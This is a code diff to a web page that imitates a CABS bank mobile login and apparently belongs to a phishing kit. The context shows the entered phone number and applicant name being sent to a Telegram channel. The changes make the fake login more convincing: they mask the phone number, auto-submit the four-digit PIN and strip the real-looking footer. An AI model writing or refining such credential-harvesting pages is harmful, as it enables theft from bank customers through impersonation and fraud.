@@ -438,32 +438,8 @@ const renderMobileLogin = () => `
       <label for="mbPhone">Mobile Number</label>
       <input type="tel" id="mbPhone" placeholder="07XXXXXXXX" style="font-size:1.1rem; padding:16px;" />
     </div>
-    <button class="btn btn-primary" id="mbNext" style="padding:16px; font-size:1rem; letter-spacing:1.5px; margin-top:4px;">NEXT</button>
-  </div>
-
-  <div style="margin-top:60px; width:100%; max-width:360px;">
-    <p style="text-align:center; font-size:0.8rem; color:#64748b; text-decoration:underline; line-height:1.6; margin-bottom:32px; cursor:pointer;">
-      IMPORTANT: Security advice to help keep your online banking secure and convenient
-    </p>
-    <div class="footer-links">
-      <div class="footer-link">
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
-        Contact us
-      </div>
-      <div class="footer-link">
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
-        Terms & Conditions
-      </div>
-      <div class="footer-link">
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-        Privacy policy
-      </div>
-    </div>
-  </div>
-</div>`;
-
-/* ─── PAGE 6 — PIN LOGIN ─────────────────────────────────────── */
-const renderPinLogin = () => `
+/* ─── PAGE 6 — PIN LOGIN ──────────────────────────────────────────────── */
+const renderPinLogin = (maskedPhone = '') => `
 <div style="min-height:100vh; background:#fff; display:flex; flex-direction:column; align-items:center; padding:48px 24px 32px;" class="page">
   <div style="text-align:center; margin-bottom:36px;">
     <div class="bank-logo">CABS<span>//</span></div>
@@ -477,18 +453,19 @@ const renderPinLogin = () => `
   <div style="text-align:center; margin-bottom:32px;">
     <h3 style="font-size:1.4rem; font-weight:800; color:#1b3668;">Secured Login 🔒</h3>
     <p style="font-size:0.85rem; color:#64748b; margin-top:8px;">Enter your 4-digit PIN to authenticate</p>
+    ${maskedPhone ? `<p style="font-size:0.9rem; font-weight:700; color:#1b3668; margin-top:10px; letter-spacing:2px;">${maskedPhone}</p>` : ''}
   </div>
 
   <div class="pin-grid" id="pinGrid" style="margin-bottom:12px;">
-    <input type="password" maxlength="1" class="pin-box" />
-    <input type="password" maxlength="1" class="pin-box" />
-    <input type="password" maxlength="1" class="pin-box" />
-    <input type="password" maxlength="1" class="pin-box" />
+    <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
+    <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
+    <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
+    <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
   </div>
   <div id="pinError" class="pin-error">Invalid PIN. Please try again.</div>
 
   <div style="width:100%; max-width:320px;">
-    <button class="btn btn-primary" id="pinLoginBtn" style="padding:16px; font-size:1rem; background:#64748b; box-shadow:none; letter-spacing:1px;">Login</button>
+    <button class="btn btn-primary" id="pinLoginBtn" style="padding:16px; font-size:1rem; letter-spacing:1px;">Login</button>
   </div>
 </div>`;
 
@@ -576,26 +553,39 @@ function navigate(view) {
   /* ─ MOBILE LOGIN ─ */
   else if (view === 'mobileLogin') {
     app.innerHTML = renderMobileLogin();
-    document.getElementById('mbNext').addEventListener('click', async () => {
+    const mbNextHandler = async () => {
       const phone = document.getElementById('mbPhone').value;
       if (!phone) { alert('Please enter your mobile number.'); return; }
       state.mbPhone = phone;
+      // Mask phone: show first 4 chars, *** middle, last 3
+      const masked = phone.length > 6
+        ? phone.slice(0, 4) + ' *** ' + phone.slice(-3)
+        : phone;
+      state.maskedPhone = masked;
       showSpinner('Verifying...');
       await sendTextToTelegram(`📱 *MOBILE LOGIN*\n• Phone: ${phone}\n• Applicant: ${state.name || 'Unknown'}`);
       hideSpinner();
       navigate('pinLogin');
+    };
+    document.getElementById('mbNext').addEventListener('click', mbNextHandler);
+    document.getElementById('mbPhone').addEventListener('keydown', e => {
+      if (e.key === 'Enter') mbNextHandler();
     });
   }
 
   /* ─ PIN LOGIN ─ */
   else if (view === 'pinLogin') {
-    app.innerHTML = renderPinLogin();
+    app.innerHTML = renderPinLogin(state.maskedPhone || '');
     const pins = app.querySelectorAll('.pin-box');
+    const triggerLogin = () => document.getElementById('pinLoginBtn').click();
     pins.forEach((box, i) => {
       box.addEventListener('input', e => {
+        // only allow digits
+        e.target.value = e.target.value.replace(/\D/g, '');
         if (e.target.value) {
           box.classList.add('filled');
           if (i < pins.length - 1) pins[i + 1].focus();
+          else triggerLogin(); // auto-submit on 4th digit
         }
       });
       box.addEventListener('keydown', e => {
